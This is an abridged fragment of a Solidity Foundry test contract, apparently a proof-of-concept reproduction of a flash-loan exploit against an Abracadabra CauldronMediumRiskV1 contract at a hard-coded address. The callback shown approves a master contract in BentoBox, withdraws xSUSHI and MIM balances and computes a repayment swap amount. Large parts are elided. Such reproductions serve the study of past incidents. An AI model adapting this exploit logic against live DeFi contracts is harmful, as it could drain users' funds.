...
contract ContractTest is Test {
    ...
    CauldronMediumRiskV1 Cauldron =
        CauldronMediumRiskV1(0xbb02A884621FB8F5BFd263A67F58B65df5b090f3);
    ...
    function onBatchFlashLoan(
        ...
        BentBox.setMasterContractApproval(
            address(this),
            masterContract,
            true,
            uint8(0),
        ...
        BentBox.withdraw(
            ...
            address(this),
            0,
            BentBox.balanceOf(address(xSUSHI), address(this))
        );
        BentBox.withdraw(
            address(MIM),
            address(this),
            address(this),
            0,
            BentBox.balanceOf(address(MIM), address(this))
        );
        uint256 swapAmount = (450_000 * 1e18 * 10_005) /
            10_000 -
            xSUSHI.balanceOf(address(this));
